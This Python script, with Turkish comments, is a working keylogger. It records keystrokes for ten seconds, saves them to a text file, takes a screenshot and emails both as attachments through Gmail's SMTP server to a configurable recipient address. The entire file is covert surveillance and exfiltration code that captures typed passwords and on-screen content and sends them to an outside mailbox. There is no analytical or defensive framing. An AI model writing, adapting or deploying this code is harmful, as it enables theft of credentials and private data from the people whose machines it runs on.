import keyboard
import pyautogui
import time
import smtplib
from email.message import EmailMessage


email_address = "your mail adress"  
email_password = "your mail password"    
recipient_email = "your mail adress"  


screenshot_count = 0


keyboard_logs = []


start_time = time.time()


keyboard.start_recording()

try:
    while True:
        if time.time() - start_time >= 10:  
            break

finally:
    
    events = keyboard.stop_recording()

    
    with open('keyboard_logs.txt', 'w') as log_file:
        for event in events:
            if event.event_type == keyboard.KEY_DOWN:
                log_file.write(event.name)
            log_file.write('\n')

    
    screenshot = pyautogui.screenshot()
    screenshot.save(f"screenshot_{screenshot_count}.png")
    screenshot_count += 1


msg = EmailMessage()

msg['Subject'] = 'Klavye Logları ve Ekran Görüntüleri'
msg['From'] = email_address
msg['To'] = recipient_email


with open('keyboard_logs.txt', 'r') as log_file:
    log_content = log_file.read()
    msg.set_content(log_content) 

with open(f'screenshot_{screenshot_count - 1}.png', 'rb') as screenshot_file:
    screenshot_data = screenshot_file.read()
    msg.add_attachment(screenshot_data, maintype='image', subtype='png', filename=f'screenshot_{screenshot_count - 1}.png')


with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:  # SMTP sunucusunun adresi ve port numarasını güncelleyin
    server.login(email_address, email_password)
    server.send_message(msg)
